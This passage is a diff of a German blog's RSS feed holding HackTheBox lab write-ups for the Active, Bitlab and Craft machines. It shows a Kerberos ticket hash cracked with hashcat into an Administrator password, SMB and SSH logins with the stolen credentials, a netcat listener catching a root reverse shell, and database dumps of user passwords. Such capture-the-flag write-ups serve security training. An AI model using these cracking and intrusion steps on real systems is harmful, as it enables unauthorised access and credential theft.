+7566579ea25ec3c81f0e8dbaa68e0c203409ebedd098cc928cab4632c401d7c5a64cc997ed3ec6e87b37b44d5dc349c25edf41623df54cde4cc356fe1023ac62684a9278bf0756d46634eb1a0379d614dd78488293b8e7a7e770ac078afdc6b60f0edd4c336557a6791<br>
+c398126c61c9e546894e29d5d7ae3111e13fbdd4c7b68be0d7e71520d3f7f1ec6826fe24683a7c9c32a16c28221ebd8b4fe61a189cfce3d2115d9840aa9e3d77a46077d05a6cca034a81117f1240fc21c9ccaba16c5bed6815a8338b75dc293b193f45b8354e0f5aa2a<br>
+cad7c1606bd5d30651e9661663211b1e11c07073c9d932e157073fd8940055a1fb2c03260af72a521c9f633412b3d1bf9e9e21b755a92d812a1e6061dff7c0564286a0c897e6be885a8fdb8b48c6314ed2d118d504675b9935f65eafecd69f57894fdee85a32950f9ef<br>
+8f21c5f6010019837d1fa1cd688161cf02a9e6eb47041a83258353fb2fdd434a20de6362cb17f42b44b53f4f7b6ecd83d1b4c23698562a1ebe5b306bc6154aaaf3668738fb72078e90ad4ce5c72cd6f92df6d6747d6fcd7d23b9616a9fdbdd4312a25960102dc9b6985<br>
+128e77fc7b6227bf27248efe90f6637e0b98bb4a72e6e452b80931649dec99bf2e8fa3c418889a6d83576110f1ad655f3e67c798b724e7b8ae1512b32ab4dbb5e46f1fd278124ba952467ec27014f0ea8e88346db8949b6c606fc9d7081ad03b85d7fa15b96a60&rsquo; &gt; s<br>
+pn.txt<br>
+root@kali:~/active# hashcat -m 13100 -a 0 spn.txt /usr/share/wordlists/rockyou.txt<br>
+hashcat (v5.0.0) starting…</p>
+<h1 id="opencl-platform-1-the-pocl-project">OpenCL Platform #1: The pocl project</h1>
+<ul>
+<li>Device #1: pthread-AMD Ryzen 7 1700 Eight-Core Processor, 1024/2295 MB allocatable, 4MCU</li>
+</ul>
+<p>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>
+Rules: 1</p>
+<p>Applicable optimizers:</p>
+<ul>
+<li>Zero-Byte</li>
+<li>Not-Iterated</li>
+<li>Single-Hash</li>
+<li>Single-Salt</li>
+</ul>
+<p>Minimum password length supported by kernel: 0<br>
+Maximum password length supported by kernel: 256</p>
+<p>ATTENTION! Pure (unoptimized) OpenCL kernels selected.<br>
+This enables cracking passwords and salts &gt; length 32 but for the price of drastically reduced performance.<br>
+If you want to switch to optimized OpenCL kernels, append -O to your commandline.</p>
+<p>Watchdog: Hardware monitoring interface not found on your system.<br>
+Watchdog: Temperature abort trigger disabled.</p>
+<ul>
+<li>Device #1: build_opts &lsquo;-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D D<br>
+GST_ELEM=4 -D KERN_TYPE=13100 -D _unroll&rsquo;<br>
+Dictionary cache hit:</li>
+<li>Filename..: /usr/share/wordlists/rockyou.txt</li>
+<li>Passwords.: 14344385</li>
+<li>Bytes…..: 139921507</li>
+<li>Keyspace..: 14344385</li>
+</ul>
+<p>$krb5tgs$23$<em>Administrator$ACTIVE.HTB$active/CIFS~445</em>$10589d87c1a98b404545a09ac0edbec8$9470373fe8ddd05e0cb35e6307ce19f2b782e291b568af5f62b6096dfb46dee03cd8add92816c256b21fc8c475acdf49e825e2f32a361bd4b94b9d56eb7<br>
+de54b8a728752c6f7e50ceb6024d388b4ba99ba4a02dd3975355f49f9184f1e6b7606f5554d5e45d28693a5aef90f0591d36567d0e8c641e16e7c8d05047b2d9d2040e5be0a37abcb7e0e106f0a98f5861f000506daef442270dba05d0a0b593a86cd2cfb231ed9a623<br>
+da2ec87bfd185a90c79baf2d05b9f6a0edd79c9a25a2087f22211dc99749099ac091fceab6647e6da19164dba1bd174df0bb0e3f82ba790f840b7b0d19fbc8d4e21077b9f7dc45cfc9e54ce9b788293c6d222504fdc995923ad940bdfc80da606708f0485b448a9e689<br>
+d165f07b1d5da0f249c5db85d98d54be7d3a985808cfee3bbeb3f875eb33e6b818ed5d2f699960280092ebf9506d0510bb3f23fd1d94ce0ee3cbd3066240ddeda67986a5b70334baea5dbd88743fb3ef843ea170ecd38469a5fa1dc957566579ea25ec3c81f0e8dbaa6<br>
+8e0c203409ebedd098cc928cab4632c401d7c5a64cc997ed3ec6e87b37b44d5dc349c25edf41623df54cde4cc356fe1023ac62684a9278bf0756d46634eb1a0379d614dd78488293b8e7a7e770ac078afdc6b60f0edd4c336557a6791c398126c61c9e546894e29d5d7<br>
+ae3111e13fbdd4c7b68be0d7e71520d3f7f1ec6826fe24683a7c9c32a16c28221ebd8b4fe61a189cfce3d2115d9840aa9e3d77a46077d05a6cca034a81117f1240fc21c9ccaba16c5bed6815a8338b75dc293b193f45b8354e0f5aa2acad7c1606bd5d30651e9661663<br>
+211b1e11c07073c9d932e157073fd8940055a1fb2c03260af72a521c9f633412b3d1bf9e9e21b755a92d812a1e6061dff7c0564286a0c897e6be885a8fdb8b48c6314ed2d118d504675b9935f65eafecd69f57894fdee85a32950f9ef8f21c5f6010019837d1fa1cd68<br>
+8161cf02a9e6eb47041a83258353fb2fdd434a20de6362cb17f42b44b53f4f7b6ecd83d1b4c23698562a1ebe5b306bc6154aaaf3668738fb72078e90ad4ce5c72cd6f92df6d6747d6fcd7d23b9616a9fdbdd4312a25960102dc9b6985128e77fc7b6227bf27248efe90<br>
+f6637e0b98bb4a72e6e452b80931649dec99bf2e8fa3c418889a6d83576110f1ad655f3e67c798b724e7b8ae1512b32ab4dbb5e46f1fd278124ba952467ec27014f0ea8e88346db8949b6c606fc9d7081ad03b85d7fa15b96a60:Ticketmaster1968</p>
+<p>Session……….: hashcat<br>
+Status………..: Cracked<br>
+Hash.Type……..: Kerberos 5 TGS-REP etype 23<br>
+Hash.Target……: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4…b96a60<br>
+Time.Started…..: Fri Dec 7 10:25:31 2018 (13 secs)<br>
+Time.Estimated…: Fri Dec 7 10:25:44 2018 (0 secs)<br>
+Guess.Base…….: File (/usr/share/wordlists/rockyou.txt)<br>
+Guess.Queue……: 1/1 (100.00%)<br>
+Speed.#1………: 780.3 kH/s (10.58ms) @ Accel:64 Loops:1 Thr:64 Vec:8<br>
+Recovered……..: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts<br>
+Progress………: 10551296/14344385 (73.56%)<br>
+Rejected………: 0/10551296 (0.00%)<br>
+Restore.Point….: 10534912/14344385 (73.44%)<br>
+Restore.Sub.#1…: Salt:0 Amplifier:0-1 Iteration:0-1<br>
+Candidates.#1….: Tioncurtis23 -&gt; TUGGIE</p>
+<p>Started: Fri Dec 7 10:25:30 2018<br>
+Stopped: Fri Dec 7 10:25:45 2018<br>
+root@kali:~/active# python smbclient.py Administrator:Ticketmaster1968@10.10.10.100<br>
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation</p>
+<p>Type help for list of commands</p>
+<h1 id="use-users-1">use Users</h1>
+<h1 id="ls-10">ls</h1>
+<p>drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 .<br>
+drw-rw-rw- 0 Sat Jul 21 16:39:20 2018 ..<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 Administrator<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 All Users<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Default<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:56 2018 Default User<br>
+-rw-rw-rw- 174 Mon Jul 16 23:01:17 2018 desktop.ini<br>
+drw-rw-rw- 0 Mon Jul 16 23:08:47 2018 Public<br>
+drw-rw-rw- 0 Sat Jul 21 17:16:32 2018 SVC_TGS</p>
+<h1 id="cd-administrator">cd Administrator</h1>
+<h1 id="ls-11">ls</h1>
+<p>drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 .<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:21 2018 ..<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 AppData<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Application Data<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Contacts<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Cookies<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Desktop<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Documents<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:27 2018 Downloads<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Favorites<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Links<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Local Settings<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Music<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 My Documents<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 NetHood<br>
+-rw-rw-rw- 524288 Mon Jul 30 19:21:29 2018 NTUSER.DAT<br>
+-rw-rw-rw- 262144 Mon Jul 30 19:21:29 2018 ntuser.dat.LOG1<br>
+-rw-rw-rw- 0 Mon Jul 16 12:14:09 2018 ntuser.dat.LOG2<br>
+-rw-rw-rw- 65536 Mon Jul 16 12:14:15 2018 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf<br>
+-rw-rw-rw- 524288 Mon Jul 16 12:14:15 2018 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms<br>
+-rw-rw-rw- 524288 Mon Jul 16 12:14:15 2018 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms<br>
+-rw-rw-rw- 20 Mon Jul 30 08:26:35 2018 ntuser.ini<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Pictures<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 PrintHood<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Recent<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Saved Games<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Searches<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 SendTo<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Start Menu<br>
+drw-rw-rw- 0 Mon Jul 16 12:14:15 2018 Templates<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 Videos</p>
+<h1 id="cd-desktop-1">cd Desktop</h1>
+<h1 id="ls-12">ls</h1>
+<p>drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 .<br>
+drw-rw-rw- 0 Mon Jul 30 15:50:10 2018 ..<br>
+-rw-rw-rw- 282 Mon Jul 30 15:50:10 2018 desktop.ini<br>
+-rw-rw-rw- 34 Sat Jul 21 17:06:06 2018 root.txt</p>
+<h1 id="get-roottxt">get root.txt</h1>
+<h1 id="exit-2">exit</h1>
+<p>root@kali:~/active# cat root.txt<br>
+b5f#########ZENSIERT#########08b</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HackTheBox - Bitlab</title>
+            <link>/posts/2010/01/hackthebox-bitlab/</link>
+            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
+            
+            <guid>/posts/2010/01/hackthebox-bitlab/</guid>
+            <description>root@kali:~# nmap -sV -sC 10.10.10.114 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-14 14:15 CET Nmap scan report for 10.10.10.114 Host is up (0.019s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA) | 256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA) |_ 256 c9:54:3d:91:01:78:03🆎16:14:6b:cc:f0:b7:3a:55 (ED25519) 80/tcp open http nginx | http-robots.txt: 55 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \xC2\xB7 GitLab |_Requested resource was http://10.</description>
+            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+<p>root@kali:~# nmap -sV -sC 10.10.10.114
+Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-01-14 14:15 CET
+Nmap scan report for 10.10.10.114
+Host is up (0.019s latency).
+Not shown: 998 filtered ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
+| 256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
+|_ 256 c9:54:3d:91:01:78:03🆎16:14:6b:cc:f0:b7:3a:55 (ED25519)
+80/tcp open http nginx
+| http-robots.txt: 55 disallowed entries (15 shown)
+| / /autocomplete/users /search /api /admin /profile
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in \xC2\xB7 GitLab
+|_Requested resource was http://10.10.10.114/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
+Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds
+root@kali:~# ssh <a href="mailto:clave@10.10.10.114">clave@10.10.10.114</a>
+The authenticity of host &lsquo;10.10.10.114 (10.10.10.114)&rsquo; can&rsquo;t be established.
+ECDSA key fingerprint is SHA256:hNHxoptKsWqkzdME7Bfb+cGjskcAAGySJazK+gDDCHQ.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &lsquo;10.10.10.114&rsquo; (ECDSA) to the list of known hosts.
+<a href="mailto:clave@10.10.10.114">clave@10.10.10.114</a>&rsquo;s password:
+Last login: Tue Jan 14 12:14:39 2020 from 10.10.14.67
+clave@bitlab:~$ cat user.txt
+1e3#########ZENSIERT#########154
+clave@bitlab:~$ clear</p>
+<!-- raw HTML omitted -->
+]]></content>
+        </item>
+        
+        <item>
+            <title>HackTheBox - Celestial</title>
+            <link>/posts/2010/01/hackthebox-celestial/</link>
+            <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
+            
+            <guid>/posts/2010/01/hackthebox-celestial/</guid>
             <description>root@kali:~# nmap -sV -sC 10.10.10.85
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-28 16:04 CEST
 Nmap scan report for 10.10.10.85
@@ -3872,11 +4246,281 @@ connect to [10.10.15.234] from (UNKNOWN) [10.10.10.85] 59534<br>
         </item>
         
         <item>
-            <title>HackTheBox - Hawk</title>
-            <link>https://www.m10x.de/posts/2010/01/hackthebox-hawk/</link>
+            <title>HackTheBox - Craft</title>
+            <link>/posts/2010/01/hackthebox-craft/</link>
             <pubDate>Fri, 01 Jan 2010 01:01:56 +0100</pubDate>
             
-            <guid>https://www.m10x.de/posts/2010/01/hackthebox-hawk/</guid>
+            <guid>/posts/2010/01/hackthebox-craft/</guid>
+            <description>HackTheBox - Craft WriteUp | Tipps + Anleitung | htb Craft ist eine der mittelschweren Maschinen von HackTheBox. Ihre Eigenschaften wurden von Benutzern auf Enumeration, Real-Life und Custom Exploitation festgelegt.
+Tipps [su_spoiler title=&amp;ldquo;Tipp 1&amp;rdquo; open=&amp;ldquo;no&amp;rdquo; style=&amp;ldquo;modern-light&amp;rdquo; icon=&amp;ldquo;plus&amp;rdquo; anchor=&amp;quot;&amp;quot; class=&amp;quot;&amp;quot;]
+[/su_spoiler]
+[su_spoiler title=&amp;ldquo;Tipp 2&amp;rdquo; open=&amp;ldquo;no&amp;rdquo; style=&amp;ldquo;modern-light&amp;rdquo; icon=&amp;ldquo;plus&amp;rdquo; anchor=&amp;quot;&amp;quot; class=&amp;quot;&amp;quot;]
+[/su_spoiler]
+[su_spoiler title=&amp;ldquo;Tipp 3&amp;rdquo; open=&amp;ldquo;no&amp;rdquo; style=&amp;ldquo;modern-light&amp;rdquo; icon=&amp;ldquo;plus&amp;rdquo; anchor=&amp;quot;&amp;quot; class=&amp;quot;&amp;quot;]
+[/su_spoiler]
+Video [su_spoiler title=&amp;ldquo;Kurzes Video Walkthrough ohne Erklärungen&amp;rdquo; open=&amp;ldquo;no&amp;rdquo; style=&amp;ldquo;modern-light&amp;rdquo; icon=&amp;ldquo;plus&amp;rdquo; anchor=&amp;quot;&amp;quot; class=&amp;quot;&amp;quot;]</description>
+            <content type="html"><![CDATA[<p><a href="http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE"><img src="http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg" alt="Kurzes Video Walkthrough ohne Erklärungen"></a></p>
+<h1 id="hackthebox---craft-writeup--tipps--anleitung--htb">HackTheBox - Craft WriteUp | Tipps + Anleitung | htb</h1>
+<p><a href="https://www.hackthebox.eu/home/machines/profile/101">Craft</a> ist eine der mittelschweren Maschinen von <a href="https://hackthebox.eu/">HackTheBox</a>. Ihre Eigenschaften wurden von Benutzern auf Enumeration, Real-Life und Custom Exploitation festgelegt.</p>
+<p><img src="https://imgur.com/FMoIkDG,jpg" alt=""><img src="https://i.imgur.com/iP9UKOM.jpg" alt="schwierigkeitsgrad"></p>
+<h2 id="tipps"><strong>Tipps</strong></h2>
+<p>[su_spoiler title=&ldquo;Tipp 1&rdquo; open=&ldquo;no&rdquo; style=&ldquo;modern-light&rdquo; icon=&ldquo;plus&rdquo; anchor=&quot;&quot; class=&quot;&quot;]</p>
+<p>[/su_spoiler]</p>
+<p>[su_spoiler title=&ldquo;Tipp 2&rdquo; open=&ldquo;no&rdquo; style=&ldquo;modern-light&rdquo; icon=&ldquo;plus&rdquo; anchor=&quot;&quot; class=&quot;&quot;]</p>
+<p>[/su_spoiler]</p>
+<p>[su_spoiler title=&ldquo;Tipp 3&rdquo; open=&ldquo;no&rdquo; style=&ldquo;modern-light&rdquo; icon=&ldquo;plus&rdquo; anchor=&quot;&quot; class=&quot;&quot;]</p>
+<p>[/su_spoiler]</p>
+<h2 id="video"><strong>Video</strong></h2>
+<p>[su_spoiler title=&ldquo;Kurzes Video Walkthrough ohne Erklärungen&rdquo; open=&ldquo;no&rdquo; style=&ldquo;modern-light&rdquo; icon=&ldquo;plus&rdquo; anchor=&quot;&quot; class=&quot;&quot;]</p>
+<!-- raw HTML omitted -->
+<p>[/su_spoiler]</p>
+<h2 id="anleitung"><strong>Anleitung</strong></h2>
+<p>[su_accordion]</p>
+<p>[su_spoiler title=&ldquo;Schritt 1&rdquo; open=&ldquo;no&rdquo; style=&ldquo;modern-light&rdquo; icon=&ldquo;plus&rdquo; anchor=&quot;&quot; class=&quot;&quot;]</p>
+<p>Als erstes machen wir natürlich einen Nmap-Scan.</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>2 offene Webserver Ports wurden gefunden.</p>
+<p>[/su_spoiler]</p>
+<p>[/su_accordion]</p>
+<p>root@kali:~# nmap -sV 10.10.10.110<br>
+Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-01-06 23:28 CET<br>
+Nmap scan report for 10.10.10.110<br>
+Host is up (0.026s latency).<br>
+Not shown: 998 closed ports<br>
+PORT STATE SERVICE VERSION<br>
+22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)<br>
+443/tcp open ssl/http nginx 1.15.8<br>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>
+Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds<br>
+root@kali:~# vim /etc/hosts<br>
+root@kali:~# vim test.py</p>
+<p>root@kali:~# python test.py<br>
+/usr/local/lib/python2.7/dist-packages/requests/packages/urllib3/connectionpool.py:789: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: h<br>
+ttps://urllib3.readthedocs.org/en/latest/security.html<br>
+InsecureRequestWarning)<br>
+/usr/local/lib/python2.7/dist-packages/requests/packages/urllib3/connectionpool.py:789: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: h<br>
+ttps://urllib3.readthedocs.org/en/latest/security.html<br>
+InsecureRequestWarning)<br>
+{&ldquo;message&rdquo;:&ldquo;Token is valid!&quot;}</p>
+<p>Create bogus ABV brew<br>
+/usr/local/lib/python2.7/dist-packages/requests/packages/urllib3/connectionpool.py:789: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: h<br>
+ttps://urllib3.readthedocs.org/en/latest/security.html<br>
+InsecureRequestWarning)</p>
+<!-- raw HTML omitted -->
+<p>root@kali:~# ifconfig tun0 [161/161]<br>
+tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500<br>
+inet 10.10.14.90 netmask 255.255.254.0 destination 10.10.14.90<br>
+inet6 dead:beef:2::1058 prefixlen 64 scopeid 0x0<!-- raw HTML omitted --><br>
+inet6 fe80::c7d0:a309:9c9:4cf prefixlen 64 scopeid 0x20<!-- raw HTML omitted --><br>
+unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 100 (UNSPEC)<br>
+RX packets 8007 bytes 6854024 (6.5 MiB)<br>
+RX errors 0 dropped 0 overruns 0 frame 0<br>
+TX packets 6960 bytes 467284 (456.3 KiB)<br>
+TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</p>
+<p>root@kali:~# nc -lnvp 1234<br>
+listening on [any] 1234 &hellip;<br>
+connect to [10.10.14.90] from (UNKNOWN) [10.10.10.110] 34871<br>
+/bin/sh: can&rsquo;t access tty; job control turned off<br>
+/opt/app # whoami<br>
+root<br>
+/opt/app # ls -alh /<br>
+total 64<br>
+drwxr-xr-x 1 root root 4.0K Feb 10 2019 .<br>
+drwxr-xr-x 1 root root 4.0K Feb 10 2019 ..<br>
+-rwxr-xr-x 1 root root 0 Feb 10 2019 .dockerenv<br>
+drwxr-xr-x 1 root root 4.0K Feb 6 2019 bin<br>
+drwxr-xr-x 5 root root 340 Jan 6 13:39 dev<br>
+drwxr-xr-x 1 root root 4.0K Feb 10 2019 etc<br>
+drwxr-xr-x 2 root root 4.0K Jan 30 2019 home<br>
+drwxr-xr-x 1 root root 4.0K Feb 6 2019 lib<br>
+drwxr-xr-x 5 root root 4.0K Jan 30 2019 media<br>
+drwxr-xr-x 2 root root 4.0K Jan 30 2019 mnt<br>
+drwxr-xr-x 1 root root 4.0K Feb 9 2019 opt<br>
+dr-xr-xr-x 254 root root 0 Jan 6 13:39 proc<br>
+drwx&mdash;&mdash; 1 root root 4.0K Jan 6 17:03 root<br>
+drwxr-xr-x 2 root root 4.0K Jan 30 2019 run<br>
+drwxr-xr-x 2 root root 4.0K Jan 30 2019 sbin<br>
+drwxr-xr-x 2 root root 4.0K Jan 30 2019 srv<br>
+dr-xr-xr-x 13 root root 0 Jan 6 13:39 sys<br>
+drwxrwxrwt 1 root root 4.0K Jan 6 21:38 tmp<br>
+drwxr-xr-x 1 root root 4.0K Feb 9 2019 usr<br>
+drwxr-xr-x 1 root root 4.0K Jan 30 2019 var<br>
+/opt/app # ls -alh<br>
+total 44<br>
+drwxr-xr-x 5 root root 4.0K Jan 6 21:18 .<br>
+drwxr-xr-x 1 root root 4.0K Feb 9 2019 ..<br>
+drwxr-xr-x 8 root root 4.0K Feb 8 2019 .git<br>
+-rw-r&ndash;r&ndash; 1 root root 18 Feb 7 2019 .gitignore<br>
+-rw-r&ndash;r&ndash; 1 root root 1.5K Feb 7 2019 app.py<br>
+drwxr-xr-x 5 root root 4.0K Feb 7 2019 craft_api<br>
+-rwxr-xr-x 1 root root 673 Feb 8 2019 dbtest.py<br>
+-rwxr-xr-x 1 root root 673 Jan 6 21:18 dbtest2.py<br>
+-rw-r&ndash;r&ndash; 1 root root 636 Jan 6 19:47 dbtestv1.py<br>
+-rw-r&ndash;r&ndash; 1 root root 635 Jan 6 14:05 dbtestv2.py<br>
+drwxr-xr-x 2 root root 4.0K Feb 7 2019 tests</p>
+<p>/opt/app # cat dbtest.py #!/usr/bin/env python</p>
+<p>import pymysql<br>
+from craft_api import settings # test connection to mysql database connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,<br>
+user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB,<br>
+cursorclass=pymysql.cursors.DictCursor) try:<br>
+with connection.cursor() as cursor: sql = &ldquo;SELECT <code>id</code>, <code>brewer</code>, <code>name</code>, <code>abv</code> FROM <code>brew</code> LIMIT 1&rdquo; cursor.execute(sql)<br>
+result = cursor.fetchone() print(result)<br>
+finally:<br>
+connection.close()/opt/app # cp dbtest.py dbtestcopy.py</p>
+<p>cat dbtest2.py<br>
+#!/usr/bin/env python</p>
+<p>import pymysql<br>
+from craft_api import settings</p>
+<h1 id="test-connection-to-mysql-database">test connection to mysql database</h1>
+<p>connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,<br>
+user=settings.MYSQL_DATABASE_USER,<br>
+password=settings.MYSQL_DATABASE_PASSWORD,<br>
+db=settings.MYSQL_DATABASE_DB,<br>
+cursorclass=pymysql.cursors.DictCursor)</p>
+<p>try:<br>
+with connection.cursor() as cursor:<br>
+sql = &ldquo;SELECT <code>id</code>, <code>brewer</code>, <code>name</code>, <code>abv</code> FROM <code>brew</code> LIMIT 1&rdquo;<br>
+cursor.execute(sql)<br>
+result = cursor.fetchone()<br>
+print(result)</p>
+<p>finally:<br>
+connection.close()/opt/app # cat dbtestv1.py<br>
+#!/usr/bin/env python</p>
+<p>import pymysql<br>
+from craft_api import settings</p>
+<h1 id="test-connection-to-mysql-database-1">test connection to mysql database</h1>
+<p>connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,<br>
+user=settings.MYSQL_DATABASE_USER,<br>
+password=settings.MYSQL_DATABASE_PASSWORD,<br>
+db=settings.MYSQL_DATABASE_DB,<br>
+cursorclass=pymysql.cursors.DictCursor)</p>
+<p>try:<br>
+with connection.cursor() as cursor:<br>
+sql = &ldquo;SELECT * FROM user&rdquo;<br>
+cursor.execute(sql)<br>
+result = cursor.fetchall()<br>
+print(result)</p>
+<p>finally:<br>
+connection.close()<br>
+/opt/app # python dbtestv1.py<br>
+[{&lsquo;id&rsquo;: 1, &lsquo;username&rsquo;: &lsquo;dinesh&rsquo;, &lsquo;password&rsquo;: &lsquo;4aUh0A8PbVJxgd&rsquo;}, {&lsquo;id&rsquo;: 4, &lsquo;username&rsquo;: &lsquo;ebachman&rsquo;, &lsquo;password&rsquo;: &lsquo;llJ77D8QFkLPQB&rsquo;}, {&lsquo;id&rsquo;: 5, &lsquo;username&rsquo;: &lsquo;gilfoyle&rsquo;, &lsquo;password&rsquo;: &lsquo;ZEU3N8WNM2rh4T&rsquo;}]</p>
+<p>root@kali:~# vim id_rsa<br>
+root@kali:~# chmod 600 id_rsa<br>
+root@kali:~# ssh <a href="mailto:gilfoyle@10.10.10.110">gilfoyle@10.10.10.110</a> -i id_rsa</p>
+<p>. * .. . * *</p>
+<ul>
+<li>
+<ul>
+<li>@()Ooc()* o .<br>
+(Q@*0CG*O() ___<br>
+|_________/|/ _ \<br>
+| | | | | / | |<br>
+| | | | | | | |<br>
+| | | | | | | |<br>
+| | | | | | | |<br>
+| | | | | | | |<br>
+| | | | | _| |<br>
+| | | | |___/<br>
+|_|__|__|_/|<br>
+_________/</li>
+</ul>
+</li>
+</ul>
+<p>Enter passphrase for key &lsquo;id_rsa&rsquo;:<br>
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</p>
+<p>The programs included with the Debian GNU/Linux system are free software;<br>
+the exact distribution terms for each program are described in the<br>
+individual files in /usr/share/doc/*/copyright.</p>
+<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>
+permitted by applicable law.<br>
+Last login: Mon Jan 6 14:53:11 2020 from 10.10.15.47<br>
+gilfoyle@craft:~$ ls<br>
+user.txt<br>
+gilfoyle@craft:~$ cat user.txt<br>
+bbf#########ZENSIERT#########2d4<br>
+gilfoyle@craft:~$ clear<br>
+gilfoyle@craft:~$ ls -alh<br>
+total 44K<br>
+drwx&mdash;&mdash; 6 gilfoyle gilfoyle 4.0K Jan 6 14:59 .<br>
+drwxr-xr-x 3 root root 4.0K Feb 9 2019 ..<br>
+-rw-r&ndash;r&ndash; 1 gilfoyle gilfoyle 634 Feb 9 2019 .bashrc<br>
+drwx&mdash;&mdash; 3 gilfoyle gilfoyle 4.0K Feb 9 2019 .config<br>
